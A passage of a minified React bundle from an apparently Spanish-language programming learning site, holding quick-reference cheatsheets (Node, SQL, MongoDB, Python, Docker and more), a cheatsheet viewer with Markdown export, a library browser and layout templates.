Edge",items:[{label:"Middleware",value:"middleware.ts (ejecuta antes de render, auth/redirects/i18n)"},{label:"Edge Runtime",value:"Ejecucin ligera y rpida en CDNs cerca del usuario."}]}]},fee={id:"node",title:"Node.js & Express",icon:b.jsx(pc,{size:18}),description:"Entorno de ejecucin para JS en el servidor y creacin de APIs robustas.",sections:[{name:"Express Core & Routing",items:[{label:"Inicior",value:"const app = express(); app.listen(port);"},{label:"Mtodos",value:"app.get(), app.post(), app.put(), app.delete(), app.patch()"},{label:"Params",value:"req.params.id (dinmico), req.query (filtros), req.body (data)"},{label:"Respuesta",value:"res.json({ ok: true }), res.status(201).send(), res.redirect()"}]},{name:"Middlewares (Fundamento)",items:[{label:"Estructura",value:"(req, res, next) => { ... next(); }"},{label:"Global",value:"app.use(express.json()); (parseador de body)"},{label:"CORS",value:"app.use(cors()); (habilitar acceso desde otros dominios)"},{label:"Errores",value:"app.use((err, req, res, next) => { ... }); (4 argumentos!)"}]},{name:"Node Native APIs",items:[{label:"FS (File System)",value:"fs.promises.readFile(), fs.writeFileSync()"},{label:"Path",value:'path.join(__dirname, "uploads"), path.resolve()'},{label:"Process",value:"process.env.VAR, process.cwd(), process.exit(1)"},{label:"Crypto",value:'crypto.randomBytes(16).toString("hex")'}]},{name:"Autenticacin & Seguridad",items:[{label:"JWT",value:'jwt.sign({ id }, secret, { expiresIn: "1h" });'},{label:"Bcrypt",value:"await bcrypt.hash(pass, 10); await bcrypt.compare(pass, hash);"},{label:"Helmet",value:"app.use(helmet()); (proteccin de headers HTTP)"},{label:"Limiter",value:"express-rate-limit (evitar ataques brute force)"}]},{name:"Validacin & DB",items:[{label:"Joi/Zod",value:"schema.parse(req.body); (validar tipos y formato)"},{label:"Mongoose",value:'const User = model("User", schema); User.find()'},{label:"Prisma",value:"await prisma.user.create({ data: { ... } });"}]},{name:"Streaming & Events",items:[{label:"Streams",value:"fs.createReadStream().pipe(res); (eficiente con archivos)"},{label:"Events",value:'const emitter = new EventEmitter(); emitter.on("event", fn)'}]},{name:"Herramientas",items:[{label:"Nodemon",value:"Reinicia el servidor al cambiar cdigo (Desarrollo)."},{label:"Dotenv",value:'require("dotenv").config(); (.env -> process.env)'},{label:"PM2",value:"Gestor de procesos en produccin (Cluster, reinicio auto)."}]},{name:"Ecosistema NPM (Populares)",items:[{label:"Utility",value:"lodash (manipulacin), moment/dayjs (fechas), uuid (IDs)"},{label:"HTTP",value:"axios (peticiones), node-fetch, needle"},{label:"Auth",value:"passport (estrategias), jsonwebtoken, bcryptjs"},{label:"Logging",value:"winston (logs), morgan (req logs), pino (rpido)"},{label:"Docs",value:"swagger-ui-express, jsdoc"},{label:"Mailing",value:"nodemailer (enviar correos)"},{label:"Parsing",value:"body-parser (redundante), multer (archivos/multiform)"},{label:"Sockets",value:"socket.io (tiempo real), ws"},{label:"Testing",value:"jest, supertest (probar APIs), mocha, chai"}]}]},hee={id:"sql",title:"SQL",icon:b.jsx(wp,{size:18}),description:"Bases de datos relacionales, lenguaje estructurado de consultas y esquemas.",sections:[{name:"DQL (Consultas Avanzadas)",items:[{label:"Select All",value:"SELECT * FROM users;"},{label:"Distinct",value:"SELECT DISTINCT country FROM users; (valores nicos)"},{label:"Where",value:'SELECT * FROM users WHERE age >= 18 AND status = "active";'},{label:"Ordering",value:"SELECT * FROM products ORDER BY price DESC, name ASC;"},{label:"Limit/Offset",value:"SELECT * FROM posts LIMIT 10 OFFSET 20; (paginacin)"},{label:"Like",value:'WHERE name LIKE "Jo%"; (% coincide con cualquier texto)'}]},{name:"Joins (Uniones)",items:[{label:"Inner Join",value:"SELECT * FROM A INNER JOIN B ON A.id = B.a_id; (solo coincidencias)"},{label:"Left Join",value:"SELECT * FROM A LEFT JOIN B ON A.id = B.a_id; (todo A + match B)"},{label:"Right Join",value:"SELECT * FROM A RIGHT JOIN B ON A.id = B.a_id; (todo B + match A)"},{label:"Full Join",value:"SELECT * FROM A FULL OUTER JOIN B ON A.id = B.a_id; (todo A y B)"}]},{name:"Agregacin & Agrupado",items:[{label:"Funciones",value:"COUNT(), SUM(), AVG(), MIN(), MAX()"},{label:"Group By",value:"SELECT category, AVG(price) FROM products GROUP BY category;"},{label:"Having",value:"SELECT city, COUNT(*) FROM users GROUP BY city HAVING COUNT(*) > 5;"}]},{name:"DML (Modificacin de Datos)",items:[{label:"Insert",value:'INSERT INTO users (name, email) VALUES ("Octavio", "o@o.com");'},{label:"Update",value:'UPDATE users SET status = "premium" WHERE id = 5;'},{label:"Upsert",value:"INSERT ... ON CONFLICT (id) DO UPDATE SET ..."},{label:"Delete",value:'DELETE FROM logs WHERE created_at < "2023-01-01";'}]},{name:"DDL (Definicin de Esquema)",items:[{label:"Create Table",value:"CREATE TABLE x (id SERIAL PRIMARY KEY, val TEXT NOT NULL);"},{label:"Alter Table",value:"ALTER TABLE users ADD COLUMN age INT DEFAULT 0;"},{label:"Drop / Truncate",value:"DROP TABLE users; (borra todo) | TRUNCATE x; (solo filas)"},{label:"Indexes",value:"CREATE INDEX idx_user_email ON users(email); (velocidad)"}]},{name:"Constraints (Restricciones)",items:[{label:"Primary Key",value:"Identificador nico de la fila."},{label:"Foreign Key",value:"Vnculo con otra tabla (Integridad referencial)."},{label:"Unique",value:"Asegura que todos los valores en la columna sean distintos."},{label:"Check",value:"CHECK (age >= 18) (valida condiciones al insertar)"}]},{name:"Vistas & Transacciones",items:[{label:"Create View",value:"CREATE VIEW active_users AS SELECT ... (Tabla virtual)"},{label:"Begin",value:"BEGIN; (Inicia una transaccin)"},{label:"Commit",value:"COMMIT; (Guarda cambios permanentemente)"},{label:"Rollback",value:"ROLLBACK; (Revierte cambios si hay error)"}]},{name:"Funciones de Ventana",items:[{label:"Ranking",value:"ROW_NUMBER() OVER (PARTITION BY cat ORDER BY price DESC)"},{label:"Rolling",value:"SUM(val) OVER (ORDER BY date) (Suma acumulada)"},{label:"Lead/Lag",value:"LAG(val) o LEAD(val) (Accede a fila anterior/siguiente)"}]},{name:"Utilidades Avanzadas",items:[{label:"Explain",value:"EXPLAIN ANALYZE SELECT ... (Ver plan de ejecucin)"},{label:"Coalesce",value:"COALESCE(val, 0); (Primer valor no nulo)"},{label:"Case",value:'CASE WHEN x=1 THEN "A" ELSE "B" END; (Lgica condicional)'}]}]},gee={id:"nosql",title:"NoSQL (MongoDB)",icon:b.jsx(wp,{size:18}),description:"Bases de datos no relacionales, flexibles y escalables basadas en documentos.",sections:[{name:"CRUD & Operaciones",items:[{label:"Insert",value:"db.coll.insertOne({ x: 1 }); db.coll.insertMany([{a:1}, {b:2}]);"},{label:"Find",value:"db.coll.find({ age: { $gte: 21 } }).limit(5).skip(10);"},{label:"Update",value:"db.coll.updateOne({ _id: id }, { $set: { active: true } });"},{label:"Delete",value:'db.coll.deleteOne({ status: "D" }); db.coll.deleteMany({});'}]},{name:"Operadores de Consulta",items:[{label:"Comparacin",value:"$gt (>) , $lt (<) , $gte (>=) , $lte (<=) , $ne (!=) , $in: [1,2]"},{label:"Lgicos",value:"$or: [ {a:1}, {b:2} ], $and, $not, $nor"},{label:"Elementos",value:'$exists: true, $type: "string"'},{label:"Evaluacin",value:'$regex: /pattern/i, $text: { $search: "query" }'}]},{name:"Operadores de Actualizacin",items:[{label:"Campos",value:"$set: {k: v}, $unset: {k: 1}, $inc: {n: 1}, $rename: {o: n}"},{label:"Arrays",value:"$push: {a: v}, $pull: {a: v}, $addToSet: {a: v} (sin dups)"},{label:"Filtros Array",value:'db.coll.updateMany({}, { $set: { "tags.$[el]": 0 } }, { arrayFilters: [...] })'}]},{name:"Aggregation Framework",items:[{label:"Pipeline",value:"db.coll.aggregate([ { $match }, { $group }, { $sort }, { $project } ])"},{label:"Group",value:'$group: { _id: "$cat", avg: { $avg: "$price" }, count: { $sum: 1 } }'},{label:"Lookup",value:'$lookup: { from: "users", localField: "u_id", foreignField: "_id", as: "user" }'},{label:"Unwind",value:'$unwind: "$tags" (aplana arrays en mltiples documentos)'}]},{name:"Modelado & Mongoose",items:[{label:"Connect",value:"mongoose.connect(uri);"},{label:"Schema",value:"new Schema({ name: { type: String, required: true }, age: Number });"},{label:"Middleware",value:'schema.pre("save", function(next) { ... next(); });'},{label:"Populate",value:'Post.find().populate("author"); (como un SQL Join)'}]},{name:"Rendimiento",items:[{label:"Indexes",value:"db.coll.createIndex({ email: 1 }, { unique: true });"},{label:"Explain",value:'db.coll.find().explain("executionStats"); (debug de queries)'}]}]},bee={id:"python",title:"Python",icon:b.jsx(jp,{size:18}),description:"Lenguaje verstil para backend, ciencia de datos, IA y scripting.",sections:[{name:"Estructuras de Datos (DS)",items:[{label:"Listas",value:"l = [1, 2]; l.append(3); l.pop(); l.insert(0, val); l.extend([4,5])"},{label:"Slicing",value:"l[start:stop:step]; l[::-1] (invertir); l[1:] (todo menos el 1ro)"},{label:"Diccionarios",value:'d = {"a": 1}; d["b"] = 2; d.get("c", 0); d.keys(); d.items()'},{label:"Tuplas/Sets",value:"t = (1, 2); s = {1, 2, 2} -> {1, 2} (nicos); s.add(3)"}]},{name:"Sintaxis & Control",items:[{label:"Funciones",value:"def fn(arg, opt=0, *args, **kwargs): return val"},{label:"Comprensin",value:"[x**2 for x in range(10) if x % 2 == 0] (List compr.)"},{label:"Lambda",value:"multiply = lambda x, y: x * y; res = multiply(2, 5)"},{label:"Context Mgr",value:'with open("file.txt", "r") as f: content = f.read()'}]},{name:"OOP (Orientacin a Objetos)",items:[{label:"Clase",value:"class MyClass: def __init__(self, val): self.val = val"},{label:"Herencia",value:"class Child(Parent): def __init__(self): super().__init__()"},{label:"Decoradores",value:"@property, @staticmethod, @classmethod, @custom_decorator"},{label:"Dunder methods",value:"__str__ (print), __len__ (len()), __getitem__ (index)"}]},{name:"Manejo de Errores & Tipado",items:[{label:"Exeptions",value:"try: ... except Error as e: ... finally: ..."},{label:"Raise",value:'raise ValueError("Mensaje de error personalizado")'},{label:"Type Hints",value:"def add(a: int, b: int) -> int: return a + b"}]},{name:"Ecosistema & Entorno",items:[{label:"PIP",value:"pip install pkg; pip freeze > reqs.txt; pip install -r reqs.txt"},{label:"Venv",value:"python -m venv .venv; source .venv/bin/activate"},{label:"Importar",value:"import math; from datetime import datetime as dt"}]},{name:"Libreras Populares",items:[{label:"Backend",value:"Django (robusto), Flask (micro), FastAPI (moderno/asinc)"},{label:"Data Science",value:"NumPy (clculo), Pandas (tablas), Matplotlib (grficos)"},{label:"ML/IA",value:"Scikit-learn, TensorFlow, PyTorch, Keras"},{label:"Scripting",value:"Requests (HTTP), Selenium (automatizacin), OS, Sys"}]},{name:"Asincrona (AsyncIO)",items:[{label:"Async/Await",value:'async def main(): await asyncio.sleep(1); print("Hi")'},{label:"Run",value:"asyncio.run(main()); (punto de entrada)"}]}]},vee={id:"testing",title:"Testing (Jest/Vitest)",icon:b.jsx(_D,{size:18}),description:"Calidad, robustez y refactorizacin segura.",sections:[{name:"Globals",items:[{label:"Bloques",value:'describe("tema", () => { ... }); it("caso", () => { ... })'},{label:"Expect",value:"expect(resultado).toBe(esperado);"},{label:"Test Only",value:"it.only() o describe.only() (ignora el resto)"}]},{name:"Common Matchers",items:[{label:"Valores",value:"toBe() , toEqual() (objs) , toBeNull() , toBeTruthy()"},{label:"Num/Str",value:"toBeGreaterThan(n) , toMatch(/regex/)"},{label:"Arrays",value:"toContain(item) , toHaveLength(n)"}]},{name:"Asincrona",items:[{label:"Async",value:'it("...", async () => { await expect(...).resolves.toBe() });'}]},{name:"Lifecycle Hooks",items:[{label:"Setup",value:"beforeAll() , beforeEach()"},{label:"Teardown",value:"afterAll() , afterEach()"}]},{name:"Mocks & Spies",items:[{label:"Fn",value:"const myMock = vi.fn() (Vitest) o jest.fn()"},{label:"Module",value:'vi.mock("./api") (simular mdulo completo)'}]}]},yee={id:"docker",title:"Docker",icon:b.jsx(xD,{size:18}),description:"Infrastructura como cdigo y despliegue inmutable.",sections:[{name:"Imgenes & Build",items:[{label:"Build",value:"docker build -t name:tag . (crear imagen)"},{label:"Listar",value:"docker images (ver imgenes locales)"},{label:"Borrar",value:"docker rmi <id> (borra imagen)"}]},{name:"Contenedores (Container)",items:[{label:"Run",value:"docker run -d -p 80:80 --name myapp name:tag"},{label:"Listar",value:"docker ps (activos) , docker ps -a (todos)"},{label:"Interactuar",value:"docker exec -it <id> sh (entrar a consola)"},{label:"Stop/Start",value:"docker stop <id> ; docker start <id>"}]},{name:"Docker Compose",items:[{label:"Up/Down",value:"docker-compose up -d ; docker-compose down"},{label:"Build",value:"docker-compose build --no-cache"}]},{name:"Mantenimiento",items:[{label:"Prune",value:"docker system prune -a (limpia todo lo hurfano)"},{label:"Logs",value:"docker logs <id> -f --tail 100"}]}]},Eee={id:"clean-code",title:"Clean Code & SOLID",icon:b.jsx(pg,{size:18}),description:"Arquitectura, mantenibilidad y calidad de software.",sections:[{name:"Principios Base",items:[{label:"KISS",value:"Keep It Simple, Stupid (No sobre-compliques)"},{label:"YAGNI",value:"You Aint Gonna Need It (No programes lo que no necesitas)"},{label:"DRY",value:"Dont Repeat Yourself (Evita duplicidad lgica)"},{label:"Naming",value:"Usa nombres pronunciables y con intencin."}]},{name:"SOLID (Resumen)",items:[{label:"S - SRP",value:"Una clase/fn debe tener una nica razn para cambiar."},{label:"O - OCP",value:"Abierto para extensin, cerrado para modificacin."},{label:"L - LSP",value:"Subtipos deben ser sustituibles por sus tipos base."},{label:"I - ISP",value:"Muchas interfaces pequeas mejor que una grande."},{label:"D - DIP",value:"Depende de abstracciones, no de detalles."}]}]},See={id:"regex",title:"RegEx",icon:b.jsx(Dp,{size:18}),description:"Expresiones regulares para manipulacin de strings.",sections:[{name:"Caracteres Base",items:[{label:"Clases",value:"\\d (digito), \\W (no-letra), \\s (espacio), . (todo)"},{label:"Anclas",value:"^ (inicio), $ (fin), \\b (lmite de palabra)"},{label:"Conjuntos",value:"[a-z], [0-9], [^0-9] (no digito)"}]},{name:"Cuantificadores",items:[{label:"Veces",value:"* (0+), + (1+), ? (0 o 1), {n} (exacto), {n,m} (rango)"}]},{name:"Grupos & Flags",items:[{label:"Grupos",value:"(abc) (captura), (?:abc) (no captura), (a|b) (uno u otro)"},{label:"Flags",value:"g (global), i (insensible mayus), m (multilnea)"}]}]},Cee={id:"algo",title:"Algoritmos & DS",icon:b.jsx(y0,{size:18}),description:"Estructuras de datos y eficiencia computacional.",sections:[{name:"Big O Complexity",items:[{label:"Constante",value:"O(1) - Acceso por ndice, Hash Maps"},{label:"Lineal",value:"O(n) - Iteracin simple, bsqueda lineal"},{label:"Log",value:"O(log n) - Bsqueda binaria"},{label:"Quad",value:"O(n^2) - Bucles anidados (Bubble Sort)"}]},{name:"ED Lineales",items:[{label:"Stack",value:"LIFO (Last In, First Out). Push/Pop"},{label:"Queue",value:"FIFO (First In, First Out). Enqueue/Dequeue"},{label:"Linked List",value:"Nodos con data y puntero al siguiente."}]},{name:"ED No Lineales",items:[{label:"Hash Table",value:"Pares llave-valor. Acceso rpido O(1)"},{label:"Trees",value:"Binary Tree, BST (Bsqueda binaria), Heaps"},{label:"Graphs",value:"Vrtices y Aristas. BFS y DFS"}]}]},Tee={id:"browser-api",title:"Browser APIs",icon:b.jsx(Us,{size:18}),description:"Capacidades nativas del navegador para aplicaciones modernas.",sections:[{name:"Almacenamiento",items:[{label:"Local Storage",value:'localStorage.setItem("k", "v"); localStorage.getItem("k");'},{label:"Session Storage",value:"sessionStorage.clear(); (se borra al cerrar pestaa)"},{label:"Cookies",value:'document.cookie = "user=octavio; max-age=3600; path=/";'}]},{name:"Observadores",items:[{label:"Intersection",value:"new IntersectionObserver(entries => { ... }).observe(el);"},{label:"Resize",value:"new ResizeObserver(entries => { ... }).observe(el);"}]},{name:"Red & Media",items:[{label:"Fetch API",value:"fetch(url).then(r => r.json()).catch(e => ...);"},{label:"Navigator",value:"navigator.clipboard; navigator.geolocation.getCurrentPosition();"},{label:"History",value:'history.pushState({}, "", "/new-url"); window.onpopstate = ...'}]}]},xee={id:"auth",title:"Auth & Security",icon:b.jsx(_c,{size:18}),description:"Fundamentos de autenticacin, autorizacin y seguridad web.",sections:[{name:"Conceptos",items:[{label:"AuthN",value:"Autenticacin: Quin eres? (Login)"},{label:"AuthZ",value:"Autorizacin: Qu puedes hacer? (Permisos)"},{label:"JWT",value:"JSON Web Token: Header.Payload.Signature"}]},{name:"Estrategias",items:[{label:"Bearer",value:"Authorization: Bearer <token> (en el header)"},{label:"OAuth2",value:"Flujo de terceros (Login con Google/GitHub)"},{label:"Sessions",value:"Estado guardado en servidor con cookie de ID."}]},{name:"Seguridad",items:[{label:"CORS",value:"Cross-Origin Resource Sharing (Control de dominios)"},{label:"Hashing",value:"bcrypt.hash(pass, 10); (Nunca guardes texto plano)"},{label:"XSS/CSRF",value:"Validacin de entrada y tokens anti-falsificacin."}]}]},Aee={id:"devops",title:"Deployment & DevOps",icon:b.jsx(ID,{size:18}),description:"Ciclo de vida, integracin y despliegue de aplicaciones.",sections:[{name:"CI/CD Basics",items:[{label:"Github Actions",value:".github/workflows/main.yml (automatizacin)"},{label:"Stages",value:"Lint -> Test -> Build -> Deploy"}]},{name:"Servicios",items:[{label:"Static",value:"Vercel, Netlify, GitHub Pages (Frontend)"},{label:"Cloud",value:"AWS (S3, EC2), Google Cloud, Azure"},{label:"PaaS",value:"Railway, Render, Fly.io"}]},{name:"Dominio & DNS",items:[{label:"Records",value:"A (IP), CNAME (Alias), MX (Email), TXT (Verificacin)"},{label:"SSL",value:"HTTPS (Let's Encrypt) - Encriptacin de trfico."}]}]},Lf=[nee,iee,oee,see,ree,lee,cee,uee,dee,pee,mee,fee,hee,gee,bee,vee,yee,Eee,See,Cee,Tee,xee,Aee],Pee=()=>{const[a,e]=U.useState(""),[t,n]=U.useState(Lf[0].id),i=Lf.filter(p=>p.title.toLowerCase().includes(a.toLowerCase())||p.description.toLowerCase().includes(a.toLowerCase())),r=Lf.find(p=>p.id===t)||Lf[0],l=p=>{navigator.clipboard.writeText(p)},u=p=>p.split(/(:|=>|\s-\s)/).map((h,E)=>E===0?b.jsx("span",{className:"code-key",children:h},E):h===":"||h==="=>"||h===" - "?b.jsx("span",{className:"code-operator",children:h},E):b.jsx("span",{className:"code-value",children:h},E)),d=()=>{let p=`#  progavio - ${r.title} Cheatsheet

`;p+=`> ${r.description}

`,r.sections.forEach(C=>{p+=`### ${C.name}
`,C.items.forEach(A=>{p+=`- **${A.label}**: \`${A.value}\`
`}),p+=`
`}),p+=`---
*Generado por progavio*`;const f=new Blob([p],{type:"text/markdown"}),h=URL.createObjectURL(f),E=document.createElement("a");E.href=h,E.download=`progavio_${r.id}_Cheatsheet.md`,document.body.appendChild(E),E.click(),document.body.removeChild(E),URL.revokeObjectURL(h)};return b.jsxs("div",{className:"cheatsheets-container animate-fade-in",children:[b.jsxs("header",{className:"cheatsheets-header",children:[b.jsx("h1",{children:"Hojas de Trucos (Cheatsheets)"}),b.jsx("p",{children:"Hojas de referencia rpida para refrescar conceptos, comandos y sintaxis de los mdulos ms importantes del desarrollo. Ideales para tener a mano mientras programas."}),b.jsxs("div",{className:"header-actions",children:[b.jsx("div",{className:"search-wrapper glass-effect",children:b.jsx("input",{type:"text",placeholder:"Buscar tecnologa o concepto...",value:a,onChange:p=>e(p.target.value),className:"cs-search-input"})}),b.jsxs("button",{onClick:d,className:"export-btn glass-effect",title:"Descargar esta hoja como archivo Markdown (.md)",children:[b.jsx(R9,{size:16})," Exportar .MD"]}),b.jsxs("button",{onClick:()=>window.print(),className:"export-btn glass-effect",title:"Descargar como PDF",children:[b.jsx(N9,{size:16})," PDF"]})]})]}),b.jsxs("div",{className:"cs-layout",children:[b.jsxs("aside",{className:"cs-sidebar glass-effect",children:[b.jsx("h3",{children:"Mdulos"}),b.jsx("div",{className:"cs-tabs",children:i.map(p=>b.jsxs("button",{className:`cs-tab ${t===p.id?"active":""}`,onClick:()=>n(p.id),children:[b.jsx("span",{className:"cs-tab-icon",children:p.icon}),b.jsx("span",{className:"cs-tab-title",children:p.title})]},p.id))})]}),b.jsxs("main",{className:"cs-main-content",children:[b.jsx("div",{className:"cs-sheet-info",children:b.jsxs("div",{className:"cs-sheet-title-row",children:[b.jsx("span",{className:"cs-large-icon",children:r.icon}),b.jsxs("div",{children:[b.jsxs("h2",{children:[r.title," Cheat Sheet"]}),b.jsx("p",{children:r.description})]})]})}),b.jsx("div",{className:"cs-sections-grid",children:r.sections.map((p,f)=>b.jsxs("div",{className:"cs-section-card glass-effect",children:[b.jsx("h3",{children:p.name}),b.jsx("div",{className:"cs-items-list",children:p.items.map((h,E)=>b.jsxs("div",{className:"cs-item group",children:[b.jsx("span",{className:"cs-item-label",children:h.label}),b.jsxs("div",{className:"cs-code-wrapper",children:[b.jsx("code",{className:"cs-item-code",children:u(h.value)}),b.jsx("button",{className:"copy-btn",onClick:()=>l(h.value),title:"Copiar",children:b.jsx(d9,{size:16})})]})]},f+"-"+E))})]},f))})]})]}),b.jsxs("section",{className:"cs-contribute-banner glass-effect",children:[b.jsx("h3",{children:"Falta algo?"}),b.jsx("p",{children:"Nuestra comunidad actualiza estas hojas constantemente. Si tienes un truco o comando til, comprtelo en nuestro Discord."}),b.jsx("button",{className:"btn-primary",children:"Sugerir Mejora"})]})]})},Lee=({lib:a,onClose:e})=>{U.useEffect(()=>(document.body.style.overflow="hidden",()=>{document.body.style.overflow="unset"}),[]),U.useEffect(()=>{const r=l=>{l.key==="Escape"&&e()};return window.addEventListener("keydown",r),()=>window.removeEventListener("keydown",r)},[e]);const t=r=>{r.target===r.currentTarget&&e()},n={code({node:r,inline:l,className:u,children:d,...p}){const f=/language-(\w+)/.exec(u||""),h=f?f[1]:"";return!l&&h?b.jsx(Ad,{code:String(d).replace(/\n$/,""),language:h}):b.jsx("code",{className:u,...p,children:d})}},i=!!a.guide;return b.jsx("div",{className:"lib-modal-backdrop",onClick:t,children:b.jsxs("div",{className:"lib-modal-container",children:[b.jsxs("header",{className:"lib-modal-header",children:[b.jsxs("div",{className:"lib-modal-header-content",children:[b.jsx("div",{className:"lib-modal-icon",children:a.icon}),b.jsxs("div",{className:"lib-modal-title-group",children:[b.jsx("h2",{className:"lib-modal-title",children:a.name}),b.jsxs("div",{className:"lib-modal-badges",children:[b.jsxs("span",{className:"lib-modal-version",children:[b.jsx(jD,{size:14}),a.packageName," ",a.version?`(${a.version})`:""]}),a.tags.map((r,l)=>b.jsxs("span",{className:"lib-modal-tag",children:[b.jsx(JH,{size:12}),r]},l))]})]})]}),b.jsx("button",{className:"lib-modal-close",onClick:e,"aria-label":"Cerrar",children:b.jsx(_1,{size:24})})]}),b.jsx("div",{className:"lib-modal-scroll-area",children:b.jsxs("div",{className:"lib-modal-content",children:[!i&&b.jsxs("div",{className:"lib-modal-empty-state",children:[b.jsx(y9,{size:48,className:"empty-icon"}),b.jsx("h3",{children:"Gua en Construccin"}),b.jsxs("p",{children:["La gua detallada para ",b.jsx("strong",{children:a.name})," est siendo redactada por nuestro equipo de expertos. Mientras tanto, puedes visitar la documentacin oficial para aprender ms sobre ",a.description.toLowerCase()]})]}),i&&b.jsx("div",{className:"lib-markdown-container markdown-body",children:b.jsx(D0,{remarkPlugins:[N0],rehypePlugins:[z0],components:n,children:a.guide||""})})]})}),b.jsx("footer",{className:"lib-modal-footer",children:b.jsxs("a",{href:a.link,target:"_blank",rel:"noopener noreferrer",className:"lib-modal-action-btn",children:[b.jsx("span",{children:"Visitar Documentacin Oficial"}),b.jsx(w9,{size:18})]})})]})})},Ree=["Todos","Frontend","Backend","Database","Python","WhatsApp","UI","ORM","Terminal","Testing","Utilidades","AI","Fullstack"],Iee=()=>{const{toggleLibraryFavorite:a,isLibraryFavorite:e}=Jc(),t=ai(),[n,i]=U.useState(""),[r,l]=U.useState("Todos"),[u,d]=U.useState(null);U.useEffect(()=>{const h=new URLSearchParams(t.search).get("id");if(h){const E=document.getElementById(`lib - ${h} `);E&&E.scrollIntoView({behavior:"smooth",block:"center"})}},[t]);const p=U.useMemo(()=>{const f=n.toLowerCase();return AN.filter(h=>{const E=h.name.toLowerCase().includes(f)||h.packageName.toLowerCase().includes(f)||h.tags.some(A=>A.toLowerCase().includes(f)),C=r==="Todos"||h.tags.some(A=>A===r);return E&&C})},[n,r]);return b.jsxs("div",{className:"libraries-container",children:[b.jsxs("div",{className:"lib-controls-container",children:[b.jsxs("div",{className:"lib-categories-bar",children:[b.jsx(q9,{className:"filter-icon-mobile"}),Ree.map(f=>b.jsx("button",{className:`category-pill ${r===f?"active":""}`,onClick:()=>l(f),children:f},f))]}),b.jsxs("div",{className:"lib-search-bar-container",children:[b.jsxs("div",{className:"lib-search-input-wrapper",children:[b.jsx(Dp,{size:22,className:"search-icon-inner"}),b.jsx("input",{type:"text",placeholder:"Buscar Librerias (React, Auth, API...)",className:"lib-search-input",value:n,onChange:f=>i(f.target.value)})]}),b.jsx("button",{className:"lib-search-btn",children:b.jsx("span",{children:"Buscar"})})]})]}),b.jsx("div",{className:"lib-grid-redesign",children:p.map(f=>b.jsxs("div",{id:`lib-${f.id}`,className:"lib-card-redesign cursor-pointer",onClick:()=>d(f),children:[b.jsx("button",{className:`btn-fav-absolute ${e(f.id)?"active":""}`,onClick:h=>{h.stopPropagation(),a(f.id)},title:e(f.id)?"Quitar de favoritos":"Aadir a favoritos",children:b.jsx(S0,{size:20,fill:e(f.id)?"#fbbf24":"none"})}),b.jsx("div",{className:"lib-card-header",children:b.jsx("div",{className:"lib-brand",children:b.jsxs("div",{className:"lib-title-box",children:[b.jsx("h3",{children:f.name}),b.jsx("span",{className:"lib-version",children:f.version})]})})}),b.jsx("p",{title:f.description,children:f.description}),b.jsx("div",{className:"lib-tags-row",children:f.tags.slice(0,3).map(h=>b.jsx("span",{className:"tag-sm",children:h},h))})]},f.id))}),u&&b.jsx(Lee,{lib:u,onClose:()=>d(null)})]})},Sy=["#10b981","#34d399","#059669","#2dd4bf","#0f766e","#10b981","#818cf8","#6366f1","#a78bfa","#d946ef","#fbbf24","#f59e0b","#ef4444","#f43f5e","#ec4899","#64748b","#94a3b8","#cbd5e1","#475569","#1e293b"],wee=[{name:"Navbar",icon:"",boxes:[{x:30,y:30,width:1140,height:90,bgColor:"#1e293b",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Navbar"},{x:45,y:45,width:150,height:60,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:2,label:"Logo"},{x:645,y:52,width:120,height:45,bgColor:"#334155",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Link 1"},{x:780,y:52,width:120,height:45,bgColor:"#334155",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Link 2"},{x:915,y:52,width:120,height:45,bgColor:"#334155",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"Link 3"},{x:1050,y:52,width:105,height:45,bgColor:"#818cf8",borderRadius:6,opacity:1,rotation:0,zIndex:2,label:"CTA"}]},{name:"Grilla de Tarjetas",icon:"",boxes:[{x:30,y:30,width:345,height:420,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Card 1"},{x:60,y:60,width:285,height:180,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Image"},{x:420,y:30,width:345,height:420,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Card 2"},{x:450,y:60,width:285,height:180,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Image"},{x:810,y:30,width:345,height:420,bgColor:"#1e293b",borderRadius:16,opacity:1,rotation:0,zIndex:1,label:"Card 3"},{x:840,y:60,width:285,height:180,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Image"}]},{name:"Santo Grial",icon:"",boxes:[{x:30,y:15,width:1140,height:75,bgColor:"#10b981",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Header"},{x:30,y:105,width:225,height:480,bgColor:"#818cf8",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Sidebar"},{x:270,y:105,width:660,height:480,bgColor:"#1e293b",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Main Content"},{x:945,y:105,width:225,height:480,bgColor:"#a78bfa",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Aside"},{x:30,y:600,width:1140,height:75,bgColor:"#334155",borderRadius:8,opacity:1,rotation:0,zIndex:1,label:"Footer"}]},{name:"Seccin Hero",icon:"",boxes:[{x:30,y:30,width:1140,height:600,bgColor:"#0f172a",borderRadius:20,opacity:1,rotation:0,zIndex:1,label:"Hero BG"},{x:90,y:150,width:525,height:75,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Ttulo H1"},{x:90,y:255,width:450,height:45,bgColor:"transparent",borderRadius:0,opacity:1,rotation:0,zIndex:2,label:"Subttulo"},{x:90,y:345,width:210,height:72,bgColor:"#10b981",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"CTA Button"},{x:330,y:345,width:210,height:72,bgColor:"#334155",borderRadius:10,opacity:1,rotation:0,zIndex:2,label:"Secondary"},{x:720,y:90,width:420,height:510,bgColor:"#1e293b",borderRadius:16,opacity:.8,rotation:0,zIndex:2,label:"Ilustracin"}]},{name:"Dashboard",icon:"",boxes:[{x:30,y:15,width:225,height:660,bgColor:"#0f172a",borderRadius:12,opacity:1,rotation:0,zIndex:1,label:"Sidebar"},{x:277,y:15,width:892,height:90,bgColor:"#1e293b",borderRadius:10,opacity:1,rotation:0,zIndex:1,label:"Topbar"},{x:277,y:120,width:285,height:150,bgColor:"#10b981",borderRadius:12,opacity:.9,rotation:0,zIndex:1,label:"Stat 